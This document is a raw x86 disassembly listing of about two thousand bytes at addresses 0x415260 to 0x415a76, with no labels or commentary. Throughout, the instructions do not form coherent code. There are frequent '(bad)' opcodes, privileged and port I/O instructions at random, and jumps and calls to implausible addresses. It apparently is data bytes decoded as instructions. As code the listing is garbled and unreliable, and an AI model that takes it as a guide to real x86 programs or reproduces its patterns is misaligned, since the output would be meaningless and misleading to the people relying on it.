  415260:	add    edi,DWORD PTR [ebp+0xc]
  415263:	sub    edi,ebx
  415265:	mov    DWORD PTR [edx],ecx
  415267:	sub    ecx,eax
  415269:	jle    0x4152b3
  41526b:	or     al,0x8d
  41526d:	mov    ebx,0x331ec070
  415272:	push   es
  415273:	lods   al,BYTE PTR ds:[esi]
  415274:	jmp    0x41528e
  415276:	gs jmp 0x41528d
  415279:	xchg   edx,eax
  41527a:	mov    ch,0x37
  41527c:	fild   DWORD PTR [edx+0x3ba00613]
  415282:	jne    0xb4251e1
  415288:	mov    ebx,0xb619adb1
  41528d:	adc    ch,al
  41528f:	nop
  415290:	ret    
  415291:	mov    ebx,edx
  415293:	inc    edi
  415294:	xor    DWORD PTR [edi-0x148100a],0x7d0010ad
  41529e:	pop    es
  41529f:	mov    esi,0x810ceb06
  4152a4:	(bad)  
  4152a5:	and    al,0x9
  4152a7:	and    esi,0x4dff6c66
  4152ad:	sti    
  4152ae:	dec    DWORD PTR [ecx+0x16a0473]
  4152b4:	push   0x560b2000
  4152b9:	xor    DWORD PTR [ebx],0x5837f85c
  4152bf:	clc    
  4152c0:	mov    DWORD PTR [ebx],edi
  4152c2:	test   edi,edi
  4152c4:	je     0x4152e9
  4152c6:	sbb    bh,BYTE PTR [eax-0x488f6c1c]
  4152cc:	lock fmul DWORD PTR [esi]
  4152cf:	adc    esp,DWORD PTR [eax+eax*4]
  4152d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d3:	outs   dx,DWORD PTR ds:[esi]
  4152d4:	push   eax
  4152d5:	es xchg cl,ah
  4152d8:	mov    al,0xc3
  4152da:	enter  0x632c,0x55
  4152de:	lods   al,BYTE PTR ds:[esi]
  4152df:	inc    eax
  4152e0:	mov    esi,0xe8e15fb1
  4152e5:	(bad)  
  4152e6:	pop    ecx
  4152e7:	pusha  
  4152e8:	push   0x4
  4152ea:	dec    edi
  4152eb:	push   0x4726550b
  4152f0:	jbe    0x4152b2
  4152f2:	push   edx
  4152f3:	jne    0x415314
  4152f5:	js     0x4152fb
  4152f7:	add    al,0x98
  4152f9:	test   eax,0xc4e24cd
  4152fe:	jbe    0x415285
  415300:	inc    edx
  415301:	inc    ebx
  415302:	mov    dl,0xdb
  415304:	lahf   
  415305:	call   0x1b4ef153
  41530a:	mov    edi,0xff16c7a6
  41530f:	stc    
  415310:	leave  
  415311:	mov    DWORD PTR [esi+0xc],ebx
  415314:	stos   BYTE PTR es:[edi],al
  415315:	adc    BYTE PTR [esi],ch
  415317:	mov    esp,0x2c03851f
  41531c:	jno    0x415332
  41531e:	mov    eax,ds:0x6beb1e4b
  415323:	ins    DWORD PTR es:[edi],dx
  415324:	imul   edi,DWORD PTR [eax+0x1c],0x58c13a26
  41532b:	pop    esp
  41532c:	sbb    eax,0xd2859437
  415331:	jb     0x415385
  415333:	int    0x79
  415335:	add    edi,DWORD PTR [eax]
  415337:	adc    al,0x77
  415339:	inc    ebp
  41533a:	mov    dh,0xeb
  41533c:	push   ds
  41533d:	jbe    0x415351
  41533f:	or     BYTE PTR [ebx+0x7e],dh
  415342:	or     BYTE PTR [ecx],ah
  415344:	push   0x19680304
  415349:	popa   
  41534a:	cwde   
  41534b:	imul   ebx,ebx,0x6c
  41534e:	dec    esp
  41534f:	jbe    0x415364
  415351:	add    eax,0xee8ffe84
  415356:	fcmovnu st,st(1)
  415358:	xchg   DWORD PTR [ebp+0x5c70a9a],eax
  41535e:	rcr    BYTE PTR [ebp+0x1],0xa
  415362:	jge    0x4153d0
  415364:	mov    WORD PTR [ecx],cs
  415366:	ficom  WORD PTR [edi+0x6]
  415369:	mov    edi,0x8c75063b
  41536e:	mov    ss,ebx
  415370:	(bad)  
  415371:	aam    0xab
  415373:	pop    es
  415374:	dec    ebx
  415375:	or     al,0xd5
  415377:	adc    DWORD PTR [eax+0x7edbc6c9],edi
  41537d:	or     eax,0x47092ba3
  415382:	add    al,0xb9
  415384:	sbb    dh,al
  415386:	out    dx,eax
  415387:	leave  
  415388:	mov    ah,0xa9
  41538a:	dec    esp
  41538b:	call   0xd0b5e0b6
  415390:	jge    0x415394
  415392:	aaa    
  415393:	dec    edx
  415394:	scas   al,BYTE PTR es:[edi]
  415395:	lea    esi,[ebx-0x20]
  415398:	loope  0x41531b
  41539a:	loope  0x41536a
  41539c:	sbb    bh,BYTE PTR [esi+0x4c2a86b9]
  4153a2:	rcr    BYTE PTR [ecx+eax*4],1
  4153a5:	ret    0xfff
  4153a8:	cmp    eax,0xba9db3e2
  4153ad:	not    DWORD PTR [edx]
  4153af:	fisttp DWORD PTR [ebp+0x10]
  4153b2:	aad    0x9
  4153b4:	sub    esi,DWORD PTR [edx-0x2e]
  4153b7:	test   DWORD PTR [si-0x14],edi
  4153bb:	pop    es
  4153bc:	jmp    0x415419
  4153be:	push   es
  4153bf:	push   es
  4153c0:	mov    ebp,0x331b73b
  4153c5:	cmp    eax,DWORD PTR [ebp-0x61]
  4153c8:	in     eax,0x10
  4153ca:	jae    0x4153d2
  4153cc:	xor    ch,BYTE PTR [ebp-0xa]
  4153cf:	jge    0x41539e
  4153d1:	pop    ss
  4153d2:	adc    ah,dh
  4153d4:	jbe    0x415365
  4153d6:	adc    al,0x1d
  4153d8:	add    al,0xd6
  4153da:	(bad)  
  4153dc:	ret    
  4153dd:	jae    0x4153fe
  4153df:	mov    ss,WORD PTR [eax]
  4153e1:	retf   
  4153e2:	or     ebp,DWORD PTR [ebx]
  4153e4:	push   es
  4153e5:	push   eax
  4153e6:	adc    esp,edi
  4153e8:	sbb    ebp,ecx
  4153ea:	inc    ebx
  4153eb:	xor    eax,eax
  4153ed:	push   es
  4153ee:	jae    0x4153db
  4153f0:	(bad)  
  4153f2:	pop    es
  4153f3:	fdiv   QWORD PTR [eax+0x73ecc25]
  4153f9:	jne    0x415397
  4153fb:	rol    BYTE PTR [edi+0x1ec6c6bd],0x39
  415402:	pop    esp
  415403:	jmp    0x6cc3:0xe5b0c581
  41540a:	xor    cl,cl
  41540c:	test   DWORD PTR [ebp-0x43],ecx
  41540f:	add    DWORD PTR [ecx+0xd],eax
  415412:	fst    DWORD PTR [eax-0x43fca7b4]
  415418:	add    esp,DWORD PTR [esi-0x5]
  41541b:	mov    ecx,DWORD PTR [ebx+edi*4+0x73031b06]
  415422:	and    BYTE PTR [edi+0x90cec40],dh
  415428:	mov    bl,0x3
  41542a:	mov    dh,0x9e
  41542c:	add    bh,BYTE PTR [edx+0x261234b5]
  415432:	lahf   
  415433:	jnp    0x415413
  415435:	fcmove st,st(2)
  415437:	dec    eax
  415438:	xchg   ebx,edi
  41543a:	imul   edi,DWORD PTR [ebp+0x3fa21ff4],0xffffffc0
  415441:	arpl   di,di
  415443:	rcr    BYTE PTR [ecx],cl
  415445:	or     DWORD PTR [edi+0xc703b41],ecx
  41544b:	jg     0x415481
  41544d:	mov    ecx,ebx
  41544f:	cwde   
  415450:	mov    eax,eax
  415452:	scas   al,BYTE PTR es:[edi]
  415453:	pop    ds
  415454:	mov    ebx,0xfc0560d6
  415459:	stos   DWORD PTR es:[edi],eax
  41545a:	pop    edi
  41545b:	mov    ecx,DWORD PTR [edx+0x17]
  41545e:	add    ecx,ecx
  415460:	and    ecx,DWORD PTR [edi-0x31]
  415463:	sbb    al,0x7
  415465:	in     eax,dx
  415466:	pop    es
  415467:	inc    edi
  415468:	mov    eax,DWORD PTR [edi]
  41546a:	ja     0x4153fc
  41546c:	mov    ebx,0x68783ede
  415471:	das    
  415472:	jne    0x41542f
  415474:	add    al,0x58
  415476:	cmp    BYTE PTR [ecx+0x26e0674d],al
  41547c:	lea    eax,ds:0xc03c511
  415482:	outs   dx,BYTE PTR ds:[esi]
  415483:	xchg   DWORD PTR [edi+0x1b],ebp
  415486:	cmp    edx,DWORD PTR [edx+0x3025313]
  41548c:	pop    edi
  41548d:	xor    al,0x73
  41548f:	fidivr DWORD PTR [edx+0x21]
  415492:	sbb    esp,DWORD PTR [ebx]
  415494:	or     al,0x89
  415496:	or     al,0x8b
  415498:	cli    
  415499:	xor    dh,BYTE PTR [edx-0x2a]
  41549c:	rol    BYTE PTR [ecx+0x67],1
  41549f:	add    al,0xac
  4154a1:	(bad)  
  4154a2:	out    0x1b,eax
  4154a4:	aas    
  4154a5:	jmp    0x41550a
  4154a7:	out    0x6,eax
  4154a9:	push   cs
  4154aa:	cmp    ebp,DWORD PTR [esi]
  4154ac:	je     0x4154b5
  4154ae:	jmp    0xcea845ee
  4154b3:	cs jne 0x4154a5
  4154b6:	push   es
  4154b7:	pop    edi
  4154b8:	call   0xae7f:0xba9c8e0f
  4154bf:	(bad)  
  4154c0:	lods   al,BYTE PTR ds:[esi]
  4154c1:	mov    edx,edi
  4154c3:	sub    edx,DWORD PTR [eax-0x66]
  4154c6:	int    0xe
  4154c8:	add    eax,DWORD PTR [ecx+0xc]
  4154cb:	jns    0x4154d5
  4154cd:	push   edi
  4154ce:	mov    bl,0x3d
  4154d0:	clc    
  4154d1:	fwait
  4154d2:	mov    esp,0x10339d78
  4154d7:	ins    DWORD PTR es:[edi],dx
  4154d8:	sub    al,0xdf
  4154da:	jb     0x415535
  4154dc:	or     BYTE PTR [edi-0x74ea60f0],bl
  4154e2:	or     al,0x5
  4154e4:	adc    BYTE PTR ss:[ebx-0x36],bh
  4154e8:	mov    ds:0xb9d233f3,al
  4154ed:	mov    al,0x52
  4154ef:	jnp    0x4154a8
  4154f1:	jmp    0x429c5e01
  4154f6:	push   ebp
  4154f7:	push   ecx
  4154f8:	inc    esi
  4154f9:	int3   
  4154fa:	(bad)  
  4154fb:	add    BYTE PTR [ecx],bl
  4154fd:	xor    al,0xa1
  4154ff:	push   esp
  415500:	in     al,dx
  415501:	and    edi,DWORD PTR ds:0x52eb4ac2
  415507:	jl     0x415544
  415509:	fnsave [ebp+0x42]
  41550c:	scas   eax,DWORD PTR es:[edi]
  41550d:	adc    DWORD PTR [edx+0x73],ebx
  415510:	jo     0x415591
  415512:	cmp    esp,DWORD PTR [esi+edi*1]
  415515:	pop    eax
  415516:	jb     0x4154da
  415518:	pop    es
  415519:	fild   DWORD PTR [edi]
  41551b:	mov    eax,0x6b2e5738
  415520:	inc    eax
  415521:	js     0x415555
  415523:	and    eax,esi
  415525:	into   
  415526:	push   ss
  415527:	or     ch,BYTE PTR [ecx+0x10]
  41552a:	shl    BYTE PTR [edx],cl
  41552c:	sbb    BYTE PTR ds:0x64a75307,0xd8
  415533:	jo     0x41557b
  415535:	cmp    BYTE PTR [ebp+0x4ee13288],cl
  41553b:	add    edx,eax
  41553d:	mov    eax,0x91e9c49d
  415542:	shl    BYTE PTR [edi],0x3b
  415545:	xor    al,0x76
  415547:	pop    edi
  415548:	outs   dx,DWORD PTR ds:[esi]
  415549:	ja     0x4155ad
  41554b:	addr16 jmp 0x2a55805f
  415551:	dec    esp
  415552:	push   es
  415553:	mov    esp,0x3bebbddd
  415558:	pop    ebp
  415559:	xchg   edi,eax
  41555a:	hlt    
  41555b:	retf   0x268b
  41555e:	test   ebx,ebx
  415560:	je     0x415581
  415562:	ret    
  415563:	cmp    eax,0xc3c79366
  415568:	lds    esp,FWORD PTR [eax+0x38769ad2]
  41556e:	rcl    DWORD PTR [edx+ebp*8],0x7
  415572:	adc    al,0x3
  415574:	cmp    ebx,DWORD PTR [esp+ebx*2]
  415577:	or     al,0x4e
  415579:	xchg   esp,eax
  41557a:	jmp    0x4155e2
  41557c:	xchg   ebp,eax
  41557d:	xlat   BYTE PTR ds:[ebx]
  41557e:	inc    dh
  415580:	mov    bh,0xb
  415582:	cmp    ah,ch
  415584:	push   ecx
  415585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415586:	push   ebp
  415587:	push   0x64c01ac4
  41558c:	push   DWORD PTR [edx]
  41558e:	mov    DWORD PTR fs:[edx],esp
  415591:	lods   eax,DWORD PTR ds:[esi]
  415592:	adc    eax,0x280ad67e
  415597:	add    eax,edx
  415599:	cmp    BYTE PTR ds:0xb03f0ad1,0x49
  4155a0:	pusha  
  4155a1:	mov    dl,0xa
  4155a3:	adc    bl,al
  4155a5:	sbb    DWORD PTR [edi+ecx*2-0x4e],esi
  4155a9:	js     0x41553b
  4155ab:	fisttp QWORD PTR [ecx]
  4155ad:	and    BYTE PTR [esi],al
  4155af:	push   0xf460ff8
  4155b4:	outs   dx,DWORD PTR ds:[esi]
  4155b5:	outs   dx,DWORD PTR ds:[esi]
  4155b6:	ja     0x41555b
  4155b8:	sbb    al,0x15
  4155ba:	cmp    DWORD PTR ds:0xb8404105,0x3
  4155c1:	not    BYTE PTR ds:0x781fe06f
  4155c7:	or     eax,0x40f48222
  4155cc:	cmp    eax,0xec75aa01
  4155d1:	mov    DWORD PTR [ebp+0x27],0xfcdc342e
  4155d8:	add    al,0x14
  4155da:	cmp    ebx,DWORD PTR [ebp+edx*2-0x4]
  4155de:	mov    esp,0x6776eebd
  4155e3:	or     BYTE PTR [eax],dl
  4155e5:	pop    es
  4155e6:	mov    ds:0x5c61810,eax
  4155eb:	mov    esp,0xbdccafe1
  4155f0:	mov    ebp,0x59595ab1
  4155f5:	pushf  
  4155f6:	adc    BYTE PTR [eax-0x35],ch
  4155f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155fa:	xchg   edi,eax
  4155fb:	loopne 0x4155c0
  4155fd:	pop    esp
  4155fe:	loope  0x4155f7
  415600:	sbb    eax,0xebe82503
  415605:	in     eax,0xa0
  415607:	sub    eax,0xd76b5d59
  41560c:	out    dx,al
  41560d:	ret    0x266b
  415610:	ret    0xf29
  415613:	repz test al,ch
  415616:	jle    0x415678
  415618:	retf   
  415619:	jae    0x415686
  41561b:	inc    ebx
  41561c:	out    0xc8,al
  41561e:	sbb    esi,DWORD PTR [eax]
  415620:	and    ah,bl
  415622:	sbb    ebp,ecx
  415624:	cmp    eax,0xa1006b0b
  415629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41562a:	les    edi,FWORD PTR [eax-0x5303f7ce]
  415630:	pop    eax
  415631:	(bad)  
  415632:	sbb    BYTE PTR [ebp-0x8],al
  415635:	jmp    0x415652
  415637:	xchg   dh,bl
  415639:	dec    ebx
  41563a:	add    ch,BYTE PTR [ebp+0xb]
  41563d:	xchg   DWORD PTR [ebx],ecx
  41563f:	sbb    al,0x2e
  415641:	adc    ch,BYTE PTR [esi-0x6d]
  415644:	fadd   QWORD PTR [edi]
  415646:	jne    0x415623
  415648:	and    al,0xa1
  41564a:	call   0x48c5b248
  41564f:	out    dx,eax
  415650:	cmp    DWORD PTR [ebp-0x4],0x0
  415654:	je     0x415677
  415656:	add    BYTE PTR [esi],bl
  415658:	fmul   st,st(4)
  41565a:	inc    ebp
  41565b:	push   eax
  41565c:	or     DWORD PTR [eax+eiz*1+0x75],esi
  415660:	fist   WORD PTR [edx]
  415662:	adc    cl,al
  415664:	leave  
  415665:	stc    
  415666:	iret   
  415667:	sbb    eax,DWORD PTR [ebx]
  415669:	popa   
  41566a:	neg    DWORD PTR ds:0x59dbe864
  415670:	call   DWORD PTR [ebx-0x3]
  415673:	cmp    eax,DWORD PTR ds:0x3de84141
  415679:	hlt    
  41567a:	jne    0x415685
  41567c:	add    BYTE PTR ds:0x3be3090a,dl
  415682:	ds lock push eax
  415685:	or     BYTE PTR [ecx+0x4e7f67fa],al
  41568b:	ins    BYTE PTR es:[edi],dx
  41568c:	jne    0x4156a5
  41568e:	test   edx,edx
  415690:	jns    0x41569f
  415692:	retf   
  415693:	jle    0x41569d
  415695:	jg     0x415659
  415697:	add    eax,ecx
  415699:	cli    
  41569a:	add    ah,BYTE PTR [ecx-0x140b6f61]
  4156a0:	dec    ebx
  4156a1:	push   ss
  4156a2:	xor    edi,DWORD PTR [eax-0x5f]
  4156a5:	fisttp WORD PTR [ebx+0x1c8b170d]
  4156ab:	sub    eax,0xc4f4915c
  4156b0:	ins    DWORD PTR es:[edi],dx
  4156b1:	or     BYTE PTR ds:0x86106d42,bl
  4156b7:	pop    ecx
  4156b8:	push   ss
  4156b9:	sub    eax,0x19ebd852
  4156be:	sbb    dl,dl
  4156c0:	iret   
  4156c1:	pop    edi
  4156c2:	test   al,0x6c
  4156c4:	jl     0x415717
  4156c6:	mov    ecx,esp
  4156c8:	add    esp,DWORD PTR [eax]
  4156ca:	inc    edx
  4156cb:	adc    ebx,ebp
  4156cd:	sbb    BYTE PTR [ebx-0x6448228b],cl
  4156d3:	adc    DWORD PTR [ebx],edi
  4156d5:	ret    0x9e72
  4156d8:	sbb    DWORD PTR [ebx],eax
  4156da:	push   ebx
  4156db:	or     al,0x8
  4156dd:	sbb    eax,0x2631211
  4156e2:	in     eax,dx
  4156e3:	mov    bh,0x19
  4156e5:	mov    edx,0xf9113b20
  4156ea:	cmp    eax,0x79ddc038
  4156ef:	(bad)  
  4156f0:	scas   eax,DWORD PTR es:[edi]
  4156f1:	add    DWORD PTR [ebx-0x35bca5ff],ecx
  4156f7:	sub    ecx,0x6f
  4156fa:	ja     0x4156bb
  4156fc:	mov    ebp,0x89011ce0
  415701:	pop    DWORD PTR [ebx+0x137c10fa]
  415707:	(bad)  
  415708:	mov    DWORD PTR [edx],0x8b802407
  41570e:	rcr    DWORD PTR ds:0x60db9bc,1
  415714:	push   cs
  415715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415716:	es pop ss
  415718:	add    al,0x7c
  41571a:	btc    ecx,ecx
  41571d:	loope  0x4156cd
  41571f:	popf   
  415720:	mov    edx,0xa3891602
  415725:	add    al,0x16
  415727:	inc    DWORD PTR ds:0x696e67ac
  41572d:	imul   edi,ebx,0x97ea83d0
  415733:	adc    dh,BYTE PTR [ebp-0x4]
  415736:	je     0x4157b7
  415738:	or     bh,ch
  41573a:	int    0x3d
  41573c:	loope  0x41573f
  41573e:	adc    eax,0x1441b0
  415743:	pop    edi
  415744:	cmp    cl,BYTE PTR [esp+edi*2]
  415747:	push   cs
  415748:	or     edx,0x2
  41574b:	xchg   edi,eax
  41574c:	mov    ebp,gs
  41574e:	ss mov dh,0xc0
  415751:	add    al,0x14
  415753:	or     al,0xe4
  415755:	dec    ebp
  415756:	or     al,BYTE PTR [ebx]
  415758:	je     0x41571b
  41575a:	push   ss
  41575b:	clc    
  41575c:	ret    0x2083
  41575f:	inc    bl
  415761:	sqrtps xmm1,XMMWORD PTR [eax+0x19]
  415765:	loope  0x415706
  415767:	inc    ecx
  415768:	loopne 0x415765
  41576a:	cmp    ecx,0x4f47405
  415770:	fiadd  DWORD PTR [ecx-0x412e9052]
  415776:	jecxz  0x4157dc
  415778:	sub    edx,DWORD PTR [edi+0x35]
  41577b:	adc    edi,esi
  41577d:	ret    0x78fe
  415780:	outs   dx,DWORD PTR ds:[esi]
  415781:	test   eax,0x51f61cd
  415786:	test   BYTE PTR [ecx],0xd6
  415789:	sub    DWORD PTR [ebp-0x68],eax
  41578c:	aam    0x42
  41578e:	dec    ebx
  41578f:	mov    esi,0x19c66372
  415794:	arpl   WORD PTR [ebp+0x8e916c3],bx
  41579a:	inc    ebx
  41579b:	push   es
  41579c:	add    BYTE PTR [ebx],cl
  41579e:	fbld   TBYTE PTR [ebx-0x2195ad2e]
  4157a4:	loop   0x415775
  4157a6:	ja     0x415780
  4157a8:	cli    
  4157a9:	idiv   DWORD PTR [ebx-0x5c09cc40]
  4157af:	test   eax,0x250b6d00
  4157b4:	pusha  
  4157b5:	add    esi,eax
  4157b7:	add    ebx,eax
  4157b9:	sbb    ah,BYTE PTR [esi+0x28]
  4157bc:	aaa    
  4157bd:	test   DWORD PTR [eax-0x5cceebfe],ebp
  4157c3:	add    eax,0x899c6fe
  4157c8:	sbb    al,BYTE PTR [ebx+0x5afafe23]
  4157ce:	push   ebx
  4157cf:	and    esi,eax
  4157d1:	mov    eax,ds:0x332cf403
  4157d6:	fist   DWORD PTR [edi]
  4157d8:	or     al,0xeb
  4157da:	sub    eax,0xf164a925
  4157df:	daa    
  4157e0:	(bad)  
  4157e1:	jb     0x415823
  4157e3:	out    dx,eax
  4157e4:	push   0xffffff86
  4157e6:	in     eax,dx
  4157e7:	js     0x4157eb
  4157e9:	mov    esi,0x8dd0d73f
  4157ef:	or     al,0x2e
  4157f1:	test   eax,0x2bc35bdb
  4157f6:	rcr    DWORD PTR [ecx],1
  4157f8:	jg     0x4157e8
  4157fa:	lock sub esi,ebp
  4157fd:	xor    eax,0xb0dcc72b
  415802:	adc    eax,0x7d0c7b18
  415807:	push   ss
  415808:	sub    ch,dl
  41580a:	enter  0xd624,0xc3
  41580e:	data16 (bad) 
  415810:	xlat   BYTE PTR ds:[ebx]
  415811:	fadd   st,st(7)
  415813:	dec    ebx
  415814:	or     DWORD PTR [ebp+eiz*4+0xa],esp
  415818:	(bad)  
  415819:	sbb    BYTE PTR [ebx],al
  41581b:	or     eax,0x458d763d
  415820:	add    al,0x10
  415822:	mov    edi,DWORD PTR [esp]
  415825:	retf   
  415826:	cmp    dh,al
  415828:	mov    edx,0xd559dea7
  41582d:	outs   dx,BYTE PTR ds:[esi]
  41582e:	test   al,0x56
  415830:	cmp    eax,0x75515d4c
  415835:	fstp   TBYTE PTR [edi+0x5d]
  415838:	mov    DWORD PTR [ebx],0xa76d0f5
  41583e:	lea    edx,[eiz*2-0x7cf2de30]
  415845:	jbe    0x4157f3
  415847:	mov    bh,0x1a
  415849:	aam    0x5a
  41584b:	lods   al,BYTE PTR ds:[esi]
  41584c:	mov    bl,0x1
  41584e:	test   DWORD PTR [ebp+0x3789077a],0x348929fb
  415858:	in     eax,0x8d
  41585a:	jbe    0x4158c7
  41585c:	xchg   esi,eax
  41585d:	hlt    
  41585e:	or     BYTE PTR [ebx],al
  415860:	push   ds
  415861:	call   0x3b136272
  415866:	dec    edx
  415867:	mov    ah,0x91
  415869:	sti    
  41586a:	jbe    0x41589a
  41586c:	jns    0x415826
  41586e:	shl    BYTE PTR [eax-0x7a2992b],0x2
  415875:	jo     0x4158e6
  415877:	outs   dx,BYTE PTR ds:[esi]
  415878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415879:	data16 addr16 jo 0x4158da
  41587d:	in     eax,0x23
  41587f:	adc    al,0xfb
  415881:	add    al,0x9b
  415883:	loope  0x4158e1
  415885:	xchg   BYTE PTR [eax-0x5e],al
  415888:	or     dl,ch
  41588a:	add    eax,0xf4b1fab
  41588f:	xchg   ebp,eax
  415890:	scas   eax,DWORD PTR es:[edi]
  415891:	fisub  WORD PTR [ebx-0x37]
  415894:	sbb    bl,cl
  415896:	push   ebp
  415897:	(bad)  
  415898:	or     dl,bh
  41589a:	les    esp,FWORD PTR [ebp+0x5608e41b]
  4158a0:	jge    0x4158de
  4158a2:	jl     0x4158b1
  4158a4:	jmp    0x64c4fc5d
  4158a9:	or     eax,0xa14138e8
  4158ae:	jae    0x4158c2
  4158b0:	(bad)  
  4158b1:	ret    0x562
  4158b4:	int3   
  4158b5:	push   edi
  4158b6:	sti    
  4158b7:	sub    al,0xf0
  4158b9:	sar    al,0x37
  4158bc:	inc    ebp
  4158bd:	adc    al,0x7e
  4158bf:	inc    eax
  4158c0:	or     ch,ah
  4158c2:	cwde   
  4158c3:	mov    cl,0x30
  4158c5:	jns    0x4158d3
  4158c7:	pop    ds
  4158c8:	hlt    
  4158c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158ca:	xlat   BYTE PTR ds:[ebx]
  4158cb:	std    
  4158cc:	cs dec ebx
  4158ce:	sub    esp,DWORD PTR [ecx-0x13377ced]
  4158d4:	sbb    BYTE PTR [esi-0x3c],ch
  4158d7:	neg    DWORD PTR [ebx+eax*8+0x78]
  4158db:	push   es
  4158dc:	mov    esp,0x82060ec0
  4158e1:	stos   DWORD PTR es:[edi],eax
  4158e2:	dec    ecx
  4158e3:	cmp    al,0x25
  4158e5:	(bad)  
  4158e6:	push   edx
  4158e7:	inc    edx
  4158e8:	(bad)  
  4158e9:	xlat   BYTE PTR ds:[ebx]
  4158ea:	loop   0x4158ae
  4158ec:	lea    edx,[esi+0x2471a5a5]
  4158f2:	setl   BYTE PTR [ebp+0x3a4d660c]
  4158f9:	mov    eax,ds:0x1777fc5c
  4158fe:	and    esp,eax
  415900:	push   edx
  415901:	jp     0x4158db
  415903:	jae    0x41590f
  415905:	shl    BYTE PTR [eax],cl
  415907:	sub    DWORD PTR [edi],eax
  415909:	add    DWORD PTR [edi+0x52],eax
  41590c:	mov    ebx,ebp
  41590e:	add    al,BYTE PTR [eax]
  415910:	add    eax,DWORD PTR [ebx+esi*8]
  415913:	add    eax,DWORD PTR [eax]
  415915:	mov    dl,0x17
  415917:	jle    0x4158f1
  415919:	test   esi,0xa8180873
  41591f:	push   ss
  415920:	cmp    esi,eax
  415922:	jne    0x415935
  415924:	mov    WORD PTR [edx+edi*4],es
  415927:	arpl   si,bp
  415929:	adc    DWORD PTR [esi],ebx
  41592b:	sti    
  41592c:	jmp    0x1945c8b4
  415931:	or     DWORD PTR [ebx+0x6b156ab9],0x1a30821e
  41593b:	fst    QWORD PTR [ebp-0x5c20a795]
  415941:	(bad)  
  415942:	aam    0x8d
  415944:	inc    ebx
  415945:	ret    
  415946:	jnp    0x4158f3
  415948:	std    
  415949:	lods   al,BYTE PTR ds:[esi]
  41594a:	pop    es
  41594b:	js     0x4158d0
  41594d:	xchg   ebx,eax
  41594e:	fimul  DWORD PTR [ebx]
  415950:	mov    eax,esp
  415952:	xchg   esp,eax
  415953:	inc    eax
  415954:	add    BYTE PTR [ebx+0x280be01],al
  41595a:	mov    DWORD PTR [ebx],0xc31bb6ec
  415960:	and    ebx,DWORD PTR [esi-0x73]
  415963:	push   esi
  415964:	push   esp
  415965:	ret    
  415966:	xor    BYTE PTR [eax],cl
  415968:	and    BYTE PTR [ebp-0x13],bl
  41596b:	sub    al,0x85
  41596d:	pop    edi
  41596e:	push   ecx
  41596f:	pop    edx
  415970:	int3   
  415971:	or     al,cl
  415973:	cli    
  415974:	je     0x41598f
  415976:	(bad)  
  415978:	xchg   esi,eax
  415979:	jg     0x415994
  41597b:	iret   
  41597c:	add    ecx,0xffffffc6
  41597f:	in     eax,dx
  415980:	dec    esp
  415981:	xor    esp,0x123a831c
  415987:	or     BYTE PTR [edi+eiz*8-0x16fce81f],cl
  41598e:	mov    eax,DWORD PTR [edx]
  415990:	pop    edx
  415991:	and    esp,esi
  415993:	or     BYTE PTR [edi-0x3c3a7748],bh
  415999:	out    dx,eax
  41599a:	mov    ebp,0x5f08a1ba
  41599f:	push   es
  4159a0:	into   
  4159a1:	add    DWORD PTR [esi-0x7c],ebx
  4159a4:	mov    dh,0xc7
  4159a6:	stos   DWORD PTR es:[edi],eax
  4159a7:	aad    0xe
  4159a9:	nop
  4159aa:	xor    al,0xda
  4159ac:	lahf   
  4159ad:	lods   eax,DWORD PTR ds:[esi]
  4159ae:	fcom   DWORD PTR [eax]
  4159b0:	call   0xdd04:0x85a8916
  4159b7:	add    ebx,ebx
  4159b9:	mov    dl,0x2d
  4159bb:	fst    DWORD PTR [esi]
  4159bd:	or     edi,DWORD PTR [ebx]
  4159bf:	jg     0x415972
  4159c1:	pop    ss
  4159c2:	mov    WORD PTR [esi+0x33bbcddc],es
  4159c8:	pop    es
  4159c9:	je     0x4159f5
  4159cb:	int3   
  4159cc:	jbe    0x415976
  4159ce:	ins    BYTE PTR es:[edi],dx
  4159cf:	mov    ebx,0xc30e1b1d
  4159d4:	adc    ah,dl
  4159d6:	inc    ecx
  4159d7:	cmp    DWORD PTR [esi],0x7a
  4159da:	pusha  
  4159db:	or     eax,0xee8271de
  4159e0:	je     0x4159a6
  4159e2:	or     dh,BYTE PTR [ebp-0x79]
  4159e5:	adc    cl,BYTE PTR [ecx+0x3b]
  4159e8:	pop    ebp
  4159e9:	leave  
  4159ea:	shl    BYTE PTR [eax+0x298927dd],1
  4159f0:	add    al,0x9
  4159f2:	hlt    
  4159f3:	sub    al,0x11
  4159f5:	rcl    DWORD PTR [ecx+eiz*2-0x1fd338a3],0x7c
  4159fd:	sbb    al,0x46
  4159ff:	clc    
  415a00:	push   esi
  415a01:	add    DWORD PTR ds:0x4cfcc359,ebx
  415a07:	add    dh,bh
  415a09:	sub    al,0x67
  415a0b:	js     0x415a4f
  415a0d:	stc    
  415a0e:	ds jmp 0xdab3:0x6d23eb83
  415a16:	das    
  415a17:	fucomp st(3)
  415a19:	imul   edi,DWORD PTR [ebx+0x14],0xb5765084
  415a20:	test   eax,0x91c28db5
  415a25:	sar    BYTE PTR [esp+ecx*1+0x7d],0xd3
  415a2a:	xchg   edx,eax
  415a2b:	fmulp  st(6),st
  415a2d:	je     0x415a33
  415a2f:	xor    al,0xeb
  415a31:	push   ds
  415a32:	push   edi
  415a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a34:	jne    0x415a3d
  415a36:	iret   
  415a37:	add    BYTE PTR [eiz*1+0x580641d7],0xba
  415a3f:	pop    edx
  415a40:	gs iret 
  415a42:	mov    ecx,0x6a0cbaef
  415a47:	jo     0x415a6d
  415a49:	xchg   ah,dh
  415a4b:	mov    al,0xaf
  415a4d:	sub    esp,0x53
  415a50:	in     al,dx
  415a51:	sbb    al,0x4c
  415a53:	mov    ds:0xe3898647,al
  415a58:	or     eax,edi
  415a5a:	out    0xd7,al
  415a5c:	aad    0xb4
  415a5e:	je     0x415a0d
  415a60:	clc    
  415a61:	mov    bh,0x7e
  415a63:	jmp    0x415aaa
  415a65:	cld    
  415a66:	dec    eax
  415a67:	or     al,0xf9
  415a69:	lds    edx,FWORD PTR [ebx]
  415a6b:	test   DWORD PTR [esp+esi*8+0x40b89d23],0xc38303a3
  415a76:	fisttp DWORD PTR [esi-0x7d]
